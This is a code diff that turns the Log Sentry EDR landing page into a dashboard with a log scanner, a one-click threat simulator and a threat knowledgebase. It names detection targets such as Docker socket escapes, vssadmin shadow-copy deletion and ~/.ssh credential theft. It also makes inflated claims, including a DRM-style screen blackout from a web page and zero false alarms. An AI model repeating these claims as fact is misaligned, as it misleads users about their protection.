+      justify-content: space-around;
+      z-index: 40;
+    }
+    .mobile-nav-btn {
       background: none;
       border: none;
       color: var(--text-sub);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+      font-size: 0.68rem;
+      font-weight: 600;
       cursor: pointer;
-      font-size: 0.82rem;
-      text-decoration: underline;
+      padding: 6px 10px;
+      border-radius: 8px;
     }
-    .footer-links button:hover, .footer-links a:hover {
-      color: #fff;
+    .mobile-nav-btn.active {
+      color: var(--accent);
+    }
+    .mobile-nav-icon {
+      font-size: 1.25rem;
     }
 
-    @media (max-width: 768px) {
-      .nav-links { display: none; }
-      .faq-grid { grid-template-columns: 1fr; }
+    @media (max-width: 820px) {
+      .desktop-nav { display: none; }
+      .mobile-nav { display: flex; }
+      header { padding: 10px 14px; }
+      main { padding: 14px 12px; }
+      .wizard-steps { grid-template-columns: 1fr; }
     }
   </style>
 </head>
 <body>
 
-  <div class="bg-grid" aria-hidden="true"></div>
+  <!-- DRM PRIVACY BLACKOUT CURTAIN (NETFLIX-STYLE BLACK SCREEN) -->
+  <div class="privacy-blackout-curtain" id="blackoutCurtain">
+    <div class="drm-shield-box">
+      <div class="drm-shield-icon">🛡️</div>
+      <div class="drm-title">CALL PRIVACY SHIELD ACTIVE</div>
+      <div class="drm-tag" id="drmDetectedTool">ONLINE CALL DETECTED // VIDEO STREAM BLOCKED</div>
+      <p class="drm-desc">
+        Screen sharing and video recording are rendered as pitch black per DRM protocol (identical to Netflix & Banking apps).
+        Audio remains uninhibited, while your telemetry, sensitive source code, and process trees are shielded from callers.
+      </p>
+      <div style="font-size: 0.75rem; color: #64748b; font-family: ui-monospace, monospace;">
+        macOS Cocoa: NSWindowSharingNone (0) • Web DisplayCapture Intercepted
+      </div>
+      <button class="btn-resume-view" onclick="togglePrivacyCallSimulation()">
+        Temporarily Deactivate / Resume Screen View ➔
+      </button>
+    </div>
+  </div>
 
-  <!-- Header Nav -->
+  <!-- Top Header -->
   <header>
-    <div class="container nav-inner">
-      <a href="#" class="brand">
-        <span class="brand-icon" aria-hidden="true">🛡️</span>
-        <span class="brand-text">Log Sentry</span>
-        <span class="brand-badge">EDR 2.0</span>
-      </a>
-      <nav class="nav-links" aria-label="Main Navigation">
-        <a href="#launch-video">Launch Video</a>
-        <a href="#vectors">Threat Vectors</a>
-        <a href="#comparison">Why Log Sentry</a>
-        <a href="#platforms">All Platforms</a>
-        <a href="#faq">FAQ</a>
-        <a href="/dashboard.html" class="btn-header-cta">Open Web GUI ➔</a>
-      </nav>
+    <div class="brand" onclick="switchTab('dashboard')">
+      <span class="brand-icon">🛡️</span>
+      <div>
+        <div class="brand-name">Log Sentry EDR</div>
+        <div class="brand-sub">UNIVERSAL THREAT DETECTION & CALL PRIVACY SHIELD</div>
+      </div>
+    </div>
+
+    <!-- Desktop Navigation -->
+    <nav class="desktop-nav">
+      <button class="nav-btn active" id="tabBtn-dashboard" onclick="switchTab('dashboard')">📊 Dashboard</button>
+      <button class="nav-btn" id="tabBtn-scanner" onclick="switchTab('scanner')">🔍 Log & Screenshot Scanner</button>
+      <button class="nav-btn" id="tabBtn-simulator" onclick="switchTab('simulator')">⚡ Threat Simulator</button>
+      <button class="nav-btn" id="tabBtn-threatdb" onclick="switchTab('threatdb')">📚 Knowledgebase</button>
+      <a href="/#launch-video" class="nav-btn" style="text-decoration:none; color: var(--accent);">🎬 Launch Video</a>
+      <a href="/" class="nav-btn" style="text-decoration:none;">🏠 Launch Site</a>
+    </nav>
+
+    <!-- Header Actions -->
+    <div class="header-actions">
+      <!-- Call Privacy Shield Button -->
+      <button class="btn-privacy-shield" id="btnPrivacyShield" onclick="togglePrivacyCallSimulation()" title="Click to test / toggle call privacy blackout">
+        <span class="pulse-dot"></span>
+        <span id="privacyShieldLabel">SHIELD: STANDBY</span>
+      </button>
+
+      <!-- Platform Host Badge -->
+      <div class="host-pill" id="clientPlatform">
+        <span id="platformText">Detecting Host...</span>
+      </div>
     </div>
   </header>
 
-  <main class="container">
-    <!-- HERO SECTION -->
-    <section class="hero" aria-labelledby="hero-title">
-      <div class="hero-badge">
-        <div class="pulse-dot" aria-hidden="true"></div>
-        <span>Behavioral Host Telemetry Engine</span>
+  <!-- Main View -->
+  <main>
+    <!-- TAB 1: DASHBOARD -->
+    <section class="tab-section active" id="sec-dashboard">
+      <!-- Live Metrics -->
+      <div class="metrics-grid">
+        <div class="metric-card">
+          <span class="metric-label">Active Threats Flagged</span>
+          <span class="metric-value" id="activeThreatsCount" style="color: var(--red);">0</span>
+        </div>
+        <div class="metric-card">
+          <span class="metric-label">Mutated / Zero-Day</span>
+          <span class="metric-value" id="mutationsCount" style="color: var(--yellow);">0</span>
+        </div>
+        <div class="metric-card">
+          <span class="metric-label">Passive Surveillance</span>
+          <span class="metric-value" id="passiveThreatsCount" style="color: var(--purple);">0</span>
+        </div>
+        <div class="metric-card">
+          <span class="metric-label">Call Privacy Shield</span>
+          <span class="metric-value" id="shieldStateDisplay" style="color: var(--green);">ARMED</span>
+        </div>
       </div>
 
-      <!-- Exactly ONE H1 on the whole page, descender-padded -->
-      <h1 class="hero-headline" id="hero-title">
-        The Behavioral EDR For The <span class="accent-emphasis">AI & Supply-Chain Era</span>
-      </h1>
-
-      <p class="hero-subhead">
-        Detect and quarantine AI agent sandbox breakouts, WannaCry ransomware, "CTRL" movie surveillance, and unauthorized Git commits directly from low-level OS event logs.
-      </p>
-
-      <!-- INTELLIGENT DEVICE DETECTION CTA -->
-      <div class="smart-device-card" id="smartCard">
-        <div class="smart-detected-label" id="smartLabel">
-          <span aria-hidden="true">⚡</span>
-          <span>Detecting your client environment...</span>
+      <!-- Live Feed -->
+      <div class="feed-container">
+        <div class="feed-header">
+          <strong style="color: #fff; font-size: 0.95rem;">Live Behavioral Telemetry & Threat Feed</strong>
+          <span style="font-size: 0.8rem; color: var(--accent);" id="liveStatus">● Sentinel Active</span>
         </div>
-
-        <a href="#" class="btn-smart-cta" id="smartBtn">
-          <span id="smartIcon" aria-hidden="true">⬇️</span>
-          <span id="smartText">Download Log Sentry</span>
-        </a>
-
-        <div class="smart-subtext" id="smartSub">
-          Verifiable Local Telemetry • Zero Kernel Extensions • Free & Open Source
-        </div>
-
-        <div style="font-size: 0.8rem; color: var(--text-sub);">
-          Looking for a different machine? <a href="#platforms" class="alt-platforms-anchor">Browse all 5 platform downloads ↓</a>
+        <div class="feed-list" id="feedList">
+          <!-- Injected dynamically -->
         </div>
       </div>
     </section>
 
-    <!-- OFFICIAL LAUNCH VIDEO SECTION -->
-    <section class="section-wrap" id="launch-video" aria-labelledby="video-title">
-      <div class="section-header">
-        <div class="hero-badge" style="margin-inline: auto; margin-bottom: 8px;">
-          <div class="pulse-dot" aria-hidden="true"></div>
-          <span>Official 64s Launch Trailer</span>
+    <!-- TAB 2: LOG & SCREENSHOT SCANNER (3-STEP EASY WIZARD) -->
+    <section class="tab-section" id="sec-scanner">
+      <div class="wizard-container">
+        <div class="wizard-header">
+          <div class="wizard-title">
+            <span>🔍 Forensic Log Scanner & Screenshot Analyzer</span>
+          </div>
+          <div style="font-size: 0.8rem; color: var(--text-sub);">
+            Step-by-step diagnostic workflow for security incidents
+          </div>
         </div>
-        <h2 class="section-title" id="video-title">Watch Log Sentry In Action</h2>
-        <p class="section-sub">Experience the 64-second behavioral EDR breakdown — from AI sandbox escapes and 'CTRL' surveillance to WannaCry ransomware mutation defense.</p>
+
+        <!-- 3-STEP WIZARD CARDS -->
+        <div class="wizard-steps">
+          <!-- STEP 1: INGEST LOGS -->
+          <div class="wizard-card">
+            <div class="step-badge">Step 1 // Ingest</div>
+            <div class="step-heading">Provide Log Streams</div>
+            <p class="step-desc">Auto-collect host logs from the last 2 minutes, upload a file, or pick a sample attack.</p>
+            
+            <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+              <button class="btn-action primary" onclick="autoCollectHostLogs()">⚡ Auto-Collect Host Logs</button>
+              <button class="btn-action" onclick="document.getElementById('fileUploadInput').click()">📁 Browse File</button>
+              <input type="file" id="fileUploadInput" style="display: none;" accept=".log,.txt,.json,.csv,.evtx" onchange="handleFileSelect(event)">
+            </div>
+
+            <div style="display: flex; gap: 6px; flex-wrap: wrap; margin-top: 4px;">
+              <span style="font-size: 0.72rem; color: var(--text-sub); align-self: center;">Samples:</span>
+              <button class="btn-action" style="padding: 4px 8px; font-size: 0.72rem;" onclick="loadSample('ransomware')">🔒 Ransomware</button>
+              <button class="btn-action" style="padding: 4px 8px; font-size: 0.72rem;" onclick="loadSample('ai_escape')">🤖 AI Breakout</button>
+              <button class="btn-action" style="padding: 4px 8px; font-size: 0.72rem;" onclick="loadSample('spyware')">👁️ Spyware</button>
+              <button class="btn-action" style="padding: 4px 8px; font-size: 0.72rem;" onclick="loadSample('worm')">🐛 Worm</button>
+            </div>
+
+            <textarea class="log-input-area" id="logInput" placeholder="System logs will appear here, or paste raw event data..."></textarea>
+          </div>
+
+          <!-- STEP 2: AUTO-SANITIZE SECRETS -->
+          <div class="wizard-card">
+            <div class="step-badge">Step 2 // Sanitize</div>
+            <div class="step-heading">Secret & PII Redaction</div>
+            <p class="step-desc">Automatically scrub GitHub tokens, AWS keys, bearer tokens, passwords, and emails before analysis.</p>
+            
+            <div style="background: #0d1424; border: 1px solid #1e293b; border-radius: 8px; padding: 12px; display: flex; flex-direction: column; gap: 8px;">
+              <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-size: 0.82rem; font-weight: 600; color: #fff;">Automatic Redaction Filter</span>
+                <span style="font-size: 0.75rem; color: var(--green); font-weight: 700;">● ACTIVE</span>
+              </div>
+              <p style="font-size: 0.75rem; color: var(--text-sub);">
+                Protects company credentials when generating or sharing incident diagnostics.
+              </p>
+              <button class="btn-action" onclick="scrubLogsNow()">🔒 Scrub Secrets In Editor Now</button>
+            </div>
+
+            <div id="redactStats" style="font-size: 0.78rem; color: var(--accent); min-height: 20px;"></div>
+          </div>
+
+          <!-- STEP 3: ATTACH SCREENSHOTS -->
+          <div class="wizard-card">
+            <div class="step-badge">Step 3 // Evidence</div>
+            <div class="step-heading">Attach Suspicious Screenshots</div>
+            <p class="step-desc">Drop screenshots, choose files, or press <code>Cmd+V</code> / <code>Ctrl+V</code> anywhere to paste clipboard captures.</p>
+            
+            <div class="screenshot-dropzone" id="shotDropzone" onclick="document.getElementById('screenshotFileInput').click()">
+              <div class="screenshot-drop-icon">🖼️</div>
+              <div class="screenshot-drop-text">Drop Screenshot Here or Click to Browse</div>
+              <div class="screenshot-drop-sub">PNG, JPG, WebP supported • Clipboard paste enabled</div>
+            </div>
+            <input type="file" id="screenshotFileInput" style="display: none;" multiple accept="image/*" onchange="handleScreenshotUpload(event)">
+
+            <!-- Attached Screenshots Gallery -->
+            <div class="screenshot-gallery" id="screenshotGallery"></div>
+          </div>
+        </div>
+
+        <!-- WIZARD ACTION BAR -->
+        <div style="display: flex; justify-content: space-between; align-items: center; border-top: 1px solid var(--card-border); padding-top: 18px; flex-wrap: wrap; gap: 12px;">
+          <div style="font-size: 0.82rem; color: var(--text-sub);">
+            Ready to correlate <span id="attachedShotsCount" style="color: var(--accent); font-weight: 700;">0 screenshots</span> with log telemetry.
+          </div>
+          <div style="display: flex; gap: 10px;">
+            <button class="btn-action" onclick="exportIncidentBundle()">📦 Export Forensic Bundle (.json)</button>
+            <button class="btn-action primary" onclick="scanCustomLog()" style="padding: 10px 24px; font-size: 0.92rem;">
+              ⚡ SCAN LOGS & SCREENSHOTS
+            </button>
+          </div>
+        </div>
       </div>
 
-      <div class="video-container-card">
-        <div class="video-frame-wrapper">
-          <video id="heroVideo" controls preload="metadata" poster="/brag.jpg" playsinline>
-            <source src="/brag.mp4" type="video/mp4">
-            <source src="/static/brag.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-          </video>
+      <!-- Scan Result Box -->
+      <div id="scanResultContainer" style="display: none; margin-top: 20px;"></div>
+    </section>
+
+    <!-- TAB 3: THREAT SIMULATOR -->
+    <section class="tab-section" id="sec-simulator">
+      <div class="sim-panel">
+        <div class="sim-head">
+          <div class="sim-title" style="font-size: 1.15rem; font-weight: 800;">⚡ Interactive Threat Simulation Deck</div>
+          <span style="font-size: 0.85rem; color: var(--text-sub);">1-Click live attack simulations to verify behavioral interception & privacy defenses</span>
         </div>
-        <div class="video-meta-bar">
-          <div class="video-meta-info">
-            <span class="video-pill">1080p Full HD</span>
-            <span class="video-pill">64.0s Runtime</span>
-            <span class="video-pill">124 BPM Electronic Score</span>
-            <span class="video-pill">8 Dynamic Acts</span>
-          </div>
-          <a href="/brag.mp4" download="LogSentry-Launch-Trailer.mp4" class="btn-download-video">
-            <span aria-hidden="true">⬇️</span> Download Trailer (MP4)
-          </a>
+        <div class="sim-grid">
+          <button class="btn-sim purple" onclick="triggerSim('ai_escape')">
+            🤖 AI Sandbox Escape
+            <span>Accesses /var/run/docker.sock & spawns subshell</span>
+          </button>
+          <button class="btn-sim red" onclick="triggerSim('ransomware')">
+            🔒 WannaCry Ransomware
+            <span>High-frequency encryption & shadow copy deletion</span>
+          </button>
+          <button class="btn-sim red" onclick="triggerSim('worm')">
+            🐛 Network Worm (SMB)
+            <span>Rapid subnet sweep on port 445 & lateral move</span>
+          </button>
+          <button class="btn-sim yellow" onclick="triggerSim('spyware')">
+            👁️ "CTRL" Movie Spyware
+            <span>Background screen capture & SSH credential scraping</span>
+          </button>
+          <button class="btn-sim" style="border-color: #38bdf8;" onclick="togglePrivacyCallSimulation()">
+            🛡️ Call Privacy Shield Blackout
+            <span>Simulates active Zoom / UPI call with DRM black screen</span>
+          </button>
+          <button class="btn-sim green" onclick="triggerSim('benign')">
+            ✅ Safe Developer Action
+            <span>Normal interactive git push (Zero false alarms)</span>
+          </button>
         </div>
       </div>
     </section>
 
-    <!-- 4 THREAT VECTORS -->
-    <section class="section-wrap" id="vectors" aria-labelledby="vectors-title">
-      <div class="section-header">
-        <h2 class="section-title" id="vectors-title">Universal Threat Interception</h2>
-        <p class="section-sub">Standard antivirus tools scan static file hashes. Log Sentry audits execution behaviors in real time.</p>
+    <!-- TAB 4: THREAT KNOWLEDGEBASE -->
+    <section class="tab-section" id="sec-threatdb">
+      <div style="display: flex; flex-direction: column; gap: 8px;">
+        <h2 style="font-size: 1.2rem; font-weight: 800;">📚 Universal Threat Archetypes & Knowledgebase</h2>
+        <p style="font-size: 0.85rem; color: var(--text-sub);">
+          Log Sentry maps behavioral TTPs to universal threat archetypes to detect both known and mutated zero-day malware.
+        </p>
       </div>
 
-      <div class="vectors-grid">
-        <article class="vector-card">
-          <h2>🤖 AI Sandbox & Agent Breakouts</h2>
-          <p>Intercepts autonomous LLM agents or containers mounting <code>/var/run/docker.sock</code>, breaking chroot isolation, or spawning unsanctioned host shells.</p>
-        </article>
-
-        <article class="vector-card">
-          <h2>🔒 WannaCry-Style Ransomware</h2>
-          <p>Canary tripwires and disk write entropy monitors catch mass encryption bursts and volume shadow copy deletion (<code>vssadmin</code>) before drives lock.</p>
-        </article>
-
-        <article class="vector-card">
-          <h2>👁️ 'CTRL' Movie Surveillance</h2>
-          <p>Passively flags background screen capture, microphone/webcam snooping, and browser credential theft from <code>~/.ssh</code> and keychain stores.</p>
-        </article>
-
-        <article class="vector-card">
-          <h2>🐙 Unauthorized Git & PR Shield</h2>
-          <p>Traces process lineage and TTY states to catch headless background scripts secretly altering <code>user.email</code> and creating unauthorized Pull Requests.</p>
-        </article>
-      </div>
-    </section>
-
-    <!-- ARCHITECTURE COMPARISON -->
-    <section class="section-wrap" id="comparison" aria-labelledby="comp-title">
-      <div class="section-header">
-        <h2 class="section-title" id="comp-title">Traditional Antivirus vs. Log Sentry EDR</h2>
-        <p class="section-sub">Why legacy file scanners have a complete blindspot against modern developer and AI-age attacks.</p>
-      </div>
-
-      <div class="table-container">
-        <table>
-          <thead>
-            <tr>
-              <th>Security Capability</th>
-              <th>Legacy Antivirus</th>
-              <th style="color: var(--accent);">Log Sentry EDR</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><strong>Detection Methodology</strong></td>
-              <td>Static file hashes on disk (.exe, .dmg)</td>
-              <td style="color: var(--accent);">Real-time OS process lineage & behavioral logs</td>
-            </tr>
-            <tr>
-              <td><strong>Legitimate CLI Abuse (Git, gh, ssh)</strong></td>
-              <td>❌ Blind (Trusts signed Apple/Microsoft binaries)</td>
-              <td style="color: var(--accent);">✅ 100% Behavioral Interception</td>
-            </tr>
-            <tr>
-              <td><strong>AI Sandbox / Container Escape</strong></td>
-              <td>❌ Unaware of container/agent IPC sockets</td>
-              <td style="color: var(--accent);">✅ Audits host socket mounts & unauthorized subshells</td>
-            </tr>
-            <tr>
-              <td><strong>Mutated / Zero-Day Malware</strong></td>
-              <td>❌ Bypassed when file hash changes</td>
-              <td style="color: var(--accent);">✅ Behaviorally matches TTPs even with zero-day hashes</td>
-            </tr>
-            <tr>
-              <td><strong>Headless Trojan PR Creation</strong></td>
-              <td>❌ 0% Visibility into SCM repositories</td>
-              <td style="color: var(--accent);">✅ Enforces TTY interactivity & author session validation</td>
-            </tr>
-            <tr>
-              <td><strong>Workstation Overhead</strong></td>
-              <td>Heavy CPU hog (>20% overhead)</td>
-              <td style="color: var(--accent);">Ultra-lightweight user-space daemon (&lt;0.5% CPU)</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-    </section>
-
-    <!-- ALL PLATFORMS -->
-    <section class="section-wrap" id="platforms" aria-labelledby="plat-title">
-      <div class="section-header">
-        <h2 class="section-title" id="plat-title">Download For Any Device</h2>
-        <p class="section-sub">Zero kernel drivers. Safe, user-space architecture available across all major operating systems.</p>
-      </div>
-
-      <div class="platforms-grid">
-        <!-- macOS -->
-        <div class="platform-card" id="card-mac">
-          <div>
-            <h2>🍏 macOS</h2>
-            <p style="margin-top: 8px;">Native <code>.app</code> bundle with Apple Unified Logging (<code>os_log</code>) integration. Supports Apple Silicon (M1/M2/M3/M4) and Intel.</p>
-          </div>
-          <a href="/download/macos" download class="btn-download-item">⬇️ Download macOS App (.zip)</a>
+      <div class="threat-grid">
+        <div class="threat-card" style="border-color: rgba(239, 68, 68, 0.4);">
+          <div class="threat-card-title" style="color: var(--red);">🔒 Ransomware / Cryptor</div>
+          <p>Actively encrypts user files at high frequency, alters extensions, deletes shadow copies, and extorts victims.</p>
+          <p><strong>Known Families:</strong> WannaCry, LockBit, Ryuk, BlackCat</p>
+          <p><strong>Mode:</strong> ACTIVE THREAT</p>
         </div>
 
-        <!-- Windows -->
-        <div class="platform-card" id="card-win">
-          <div>
-            <h2>🪟 Windows</h2>
-            <p style="margin-top: 8px;">Windows Event Log & Sysmon monitoring with 1-click launcher batch script (<code>run_app.bat</code>) and native desktop UI.</p>
-          </div>
-          <a href="/download/windows" download class="btn-download-item">⬇️ Download Windows Package (.zip)</a>
+        <div class="threat-card" style="border-color: rgba(168, 85, 247, 0.4);">
+          <div class="threat-card-title" style="color: var(--purple);">🤖 AI Agent Sandbox Escape</div>
+          <p>An autonomous AI agent or sandboxed container escaping containment, mounting host sockets, or spawning unauthorized subshells.</p>
+          <p><strong>Known Families:</strong> DockerSocketEscape, LLM-PromptInject-Spawn</p>
+          <p><strong>Mode:</strong> ACTIVE THREAT</p>
         </div>
 
-        <!-- Linux -->
-        <div class="platform-card" id="card-linux">
-          <div>
-            <h2>🐧 Linux</h2>
-            <p style="margin-top: 8px;">Lightweight user-space daemon with process tree inspection. Includes standalone terminal & web GUI.</p>
-          </div>
-          <a href="/download/linux" download class="btn-download-item">⬇️ Download Linux Archive (.tar.gz)</a>
+        <div class="threat-card" style="border-color: rgba(245, 158, 11, 0.4);">
+          <div class="threat-card-title" style="color: var(--yellow);">👁️ Spyware / Surveillance ("CTRL")</div>
+          <p>Passively captures user input, keystrokes, webcam feeds, screen recordings, and extracts browser credentials.</p>
+          <p><strong>Known Families:</strong> Pegasus, RedLine Stealer, AgentTesla, CTRL-Trojan</p>
+          <p><strong>Mode:</strong> PASSIVE THREAT</p>
         </div>
 
-        <!-- iOS -->
-        <div class="platform-card" id="card-ios">
-          <div>
-            <h2>📱 Apple iOS</h2>
-            <p style="margin-top: 8px;">Progressive Web App (PWA). Open in Safari and tap <strong>Share ➔ "Add to Home Screen"</strong> for standalone app mode.</p>
-          </div>
-          <a href="/dashboard.html" class="btn-download-item">📲 Open iOS Web App</a>
-        </div>
-
-        <!-- Android -->
-        <div class="platform-card" id="card-android">
-          <div>
-            <h2>🤖 Android</h2>
-            <p style="margin-top: 8px;">Touch-optimized client with bottom navigation. Install directly from Chrome via <strong>"Install App"</strong>.</p>
-          </div>
-          <a href="/dashboard.html" class="btn-download-item">📲 Open Android App</a>
-        </div>
-      </div>
-    </section>
-
-    <!-- FAQ -->
-    <section class="section-wrap" id="faq" aria-labelledby="faq-title">
-      <div class="section-header">
-        <h2 class="section-title" id="faq-title">Frequently Asked Questions</h2>
-        <p class="section-sub">Technical details on Log Sentry's behavioral telemetry engine.</p>
-      </div>
-
-      <div class="faq-grid">
-        <div class="faq-item">
-          <h2>How does it catch mutated malware without signatures?</h2>
-          <p>Attackers frequently mutate source code or change hashes, but they cannot hide operating system behavior. A ransomware must perform rapid file modifications; an AI escape must touch host sockets; a worm must scan ports. Log Sentry matches these immutable behavioral patterns.</p>
-        </div>
-
-        <div class="faq-item">
-          <h2>Does Log Sentry slow down developer builds?</h2>
-          <p>No. Log Sentry runs entirely in user-space using non-blocking stream filters (macOS <code>log stream</code> and Windows Sysmon). It consumes &lt;0.5% CPU and ~40MB RAM.</p>
-        </div>
-
-        <div class="faq-item">
-          <h2>What happens when a threat is flagged?</h2>
-          <p>Log Sentry displays an instant desktop alert detailing the offending PID, command line, and ancestor process tree. In Active Defense mode, it sends SIGSTOP or SIGKILL to freeze the process before completion.</p>
-        </div>
-
-        <div class="faq-item">
-          <h2>Can it monitor remote devices or mobile phones?</h2>
-          <p>Yes. Log Sentry serves a secure REST API and responsive PWA web client, allowing authorized access over your local network or private VPN.</p>
+        <div class="threat-card" style="border-color: rgba(56, 189, 248, 0.4);">
+          <div class="threat-card-title" style="color: var(--accent);">🛡️ Anti-Screen Sharing Shield</div>
+          <p>Renders window completely black during active calls (Zoom, Meet, FaceTime, Teams, UPI apps) to prevent visual exfiltration.</p>
+          <p><strong>Protocol:</strong> DRM NSWindowSharingNone / MediaStream Guard</p>
+          <p><strong>Mode:</strong> DEFENSIVE COUNTERMEASURE</p>
         </div>
       </div>
     </section>
   </main>
 
-  <!-- GDPR Art. 6 Cookie Consent Management (CMP) -->
-  <aside class="cookie-banner" id="cookieBanner" aria-label="Cookie Consent">
-    <div>
-      <strong style="color: #fff;">Privacy & Local Telemetry Notice</strong>
-      <p style="margin-top: 4px; color: var(--text-sub);">
-        Log Sentry operates with 100% local processing. We use only essential cookies to preserve your threat filter preferences. No personal telemetry is exported.
-      </p>
-    </div>
-    <div class="cookie-banner-actions">
-      <button class="btn-cookie btn-cookie-secondary" onclick="dismissCookies('essential')">Essential Only</button>
-      <button class="btn-cookie btn-cookie-primary" onclick="dismissCookies('accept')">Accept All</button>
-    </div>
-  </aside>
+  <!-- Mobile Bottom Navigation Bar (iOS / Android) -->
+  <nav class="mobile-nav">
+    <button class="mobile-nav-btn active" id="mTab-dashboard" onclick="switchTab('dashboard')">
+      <span class="mobile-nav-icon">📊</span>
+      <span>Dashboard</span>
+    </button>
+    <button class="mobile-nav-btn" id="mTab-scanner" onclick="switchTab('scanner')">
+      <span class="mobile-nav-icon">🔍</span>
+      <span>Scanner</span>
+    </button>
+    <button class="mobile-nav-btn" id="mTab-simulator" onclick="switchTab('simulator')">
+      <span class="mobile-nav-icon">⚡</span>
+      <span>Simulator</span>
+    </button>
+    <button class="mobile-nav-btn" id="mTab-threatdb" onclick="switchTab('threatdb')">
+      <span class="mobile-nav-icon">📚</span>
+      <span>Threat DB</span>
+    </button>
+  </nav>
 
-  <!-- Legal Modal: Privacy Policy (GDPR Art. 6 Compliant) -->
-  <div class="legal-modal-overlay" id="privacyModal" role="dialog" aria-modal="true" aria-labelledby="privacyTitle">
-    <div class="legal-modal">
-      <div class="legal-header">
-        <strong id="privacyTitle" style="color: #fff; font-size: 1.05rem;">Privacy Policy & GDPR Disclosure</strong>
-        <button onclick="closeLegalModal('privacyModal')" style="background: none; border: none; color: #94a3b8; font-size: 1.4rem; cursor: pointer;">&times;</button>
+  <!-- Remediation Playbook Modal -->
+  <div class="modal-overlay" id="playbookModal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <strong id="modalTitle" style="color: #fff; font-size: 1.1rem;">Emergency Remediation Advisory</strong>
+        <button onclick="closeModal()" style="background: none; border: none; color: #94a3b8; font-size: 1.5rem; cursor: pointer;">&times;</button>
       </div>
-      <div class="legal-body">
-        <p><strong>1. Data Minimization & Local Processing (GDPR Art. 5 & 6)</strong></p>
-        <p>Log Sentry operates strictly on a local-first paradigm. System log telemetry ingested from macOS Unified Logging, Windows Event Logs, and Linux auditd is processed entirely within local memory and committed exclusively to your local SQLite database (<code>sentinel.db</code>). No process trees, command lines, or telemetry are transmitted to external servers.</p>
-        <p><strong>2. User Rights & Data Erasure</strong></p>
-        <p>You retain absolute ownership of all logged forensics. At any time, you can purge the local audit history by deleting <code>sentinel.db</code> or via the EDR dashboard settings.</p>
-        <p><strong>3. Contact & Inquiries</strong></p>
-        <p>For research and compliance questions: privacy@logsentry.io (Maintained by Vatsal Agarwal).</p>
+      <div class="modal-body">
+        <div id="modalMeta"></div>
+        <strong>Step-by-Step Disablement Advisory:</strong>
+        <div class="playbook-box" id="modalPlaybook"></div>
       </div>
-      <div class="legal-footer">
-        <button class="btn-header-cta" onclick="closeLegalModal('privacyModal')">Close</button>
+      <div class="modal-footer">
+        <button class="btn btn-secondary" onclick="closeModal()">Dismiss</button>
+        <button class="btn btn-danger" id="quarantineBtn" onclick="quarantineCurrentThreat()">Quarantine & Terminate (SIGKILL)</button>
       </div>
     </div>
   </div>
 
-  <!-- Legal Modal: Terms of Service -->
-  <div class="legal-modal-overlay" id="termsModal" role="dialog" aria-modal="true" aria-labelledby="termsTitle">
-    <div class="legal-modal">
-      <div class="legal-header">
-        <strong id="termsTitle" style="color: #fff; font-size: 1.05rem;">Terms of Service & Usage License</strong>
-        <button onclick="closeLegalModal('termsModal')" style="background: none; border: none; color: #94a3b8; font-size: 1.4rem; cursor: pointer;">&times;</button>
-      </div>
-      <div class="legal-body">
-        <p><strong>1. License & Permitted Use</strong></p>
-        <p>Log Sentry is provided as academic and open research software under the MIT License. Users are authorized to deploy, audit, and run Log Sentry on workstations and servers under their direct control.</p>
-        <p><strong>2. Defensive & Diagnostic Purpose</strong></p>
-        <p>Log Sentry is designed exclusively for defense, supply-chain monitoring, and incident mitigation. Automated process quarantine actions (SIGKILL) should be configured in compliance with organizational operational guidelines.</p>
-      </div>
-      <div class="legal-footer">
-        <button class="btn-header-cta" onclick="closeLegalModal('termsModal')">Close</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Footer -->
-  <footer>
-    <div class="container footer-inner">
-      <div style="display: flex; align-items: center; gap: 8px;">
-        <span aria-hidden="true">🛡️</span>
-        <strong style="color: #fff; font-size: 0.95rem;">Log Sentry EDR</strong>
-      </div>
-      <p>Universal Endpoint Detection, Threat Mutation Profiler & Remediation System</p>
-      <div class="footer-links">
-        <button onclick="openLegalModal('privacyModal')">Privacy Policy</button>
-        <button onclick="openLegalModal('termsModal')">Terms of Service</button>
-        <a href="/static/llms.txt" target="_blank">llms.txt</a>
-        <a href="/static/robots.txt" target="_blank">robots.txt</a>
-      </div>
-      <p style="font-size: 0.75rem; color: #64748b;">
-        Designed & Engineered by Vatsal Agarwal | Academic Research & Supply Chain Defense 2026–2027
-      </p>
-    </div>
-  </footer>
-
-  <!-- INTELLIGENT DEVICE DETECTION SCRIPT -->
   <script>
-    function detectClientEnvironment() {
-      const ua = navigator.userAgent || "";
-      const platform = navigator.platform || "";
-      let client = {
-        os: "Universal",
-        icon: "💻",
-        title: "Download Log Sentry",
-        subtext: "Cross-Platform EDR for macOS, Windows, Linux, iOS & Android",
-        href: "#platforms",
-        isMobile: false
-      };
+    let threats = [];
+    let attachedScreenshots = [];
+    let activeModalItem = null;
+    let blackoutActive = false;
 
-      // 1. Apple iOS (iPhone/iPad)
-      if (/iPhone|iPad|iPod/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-        client = {
-          os: "Apple iOS",
-          icon: "📱",
-          title: "Install on iOS (iPhone / iPad)",
-          subtext: "Progressive Web App • Tap Share ➔ 'Add to Home Screen'",
-          href: "/dashboard.html",
-          isMobile: true
-        };
-      }
-      // 2. Android
-      else if (/Android/.test(ua)) {
-        client = {
-          os: "Android",
-          icon: "🤖",
-          title: "Install on Android App",
-          subtext: "Touch-Optimized PWA • Install via Chrome Menu",
-          href: "/dashboard.html",
-          isMobile: true
-        };
-      }
-      // 3. macOS
-      else if (/Macintosh|MacIntel|MacPPC|Mac68K/.test(ua) || /Mac/.test(platform)) {
-        const isArm = /ARM|Apple/i.test(navigator.platform) || (navigator.userAgentData && navigator.userAgentData.architecture === 'arm');
-        client = {
-          os: "macOS",
-          icon: "🍏",
-          title: `Download for macOS (${isArm ? "Apple Silicon M-Series" : "Universal"})`,
-          subtext: "Native LogSentry.app Bundle (.zip) • macOS 11.0+ Big Sur to macOS 15+",
-          href: "/download/macos",
-          isMobile: false
-        };
-      }
-      // 4. Windows
-      else if (/Win32|Win64|Windows|WinCE/.test(ua) || /Win/.test(platform)) {
-        client = {
-          os: "Windows",
-          icon: "🪟",
-          title: "Download for Windows 10 / 11",
-          subtext: "Windows Standalone Package (.zip with run_app.bat) • 64-bit",
-          href: "/download/windows",
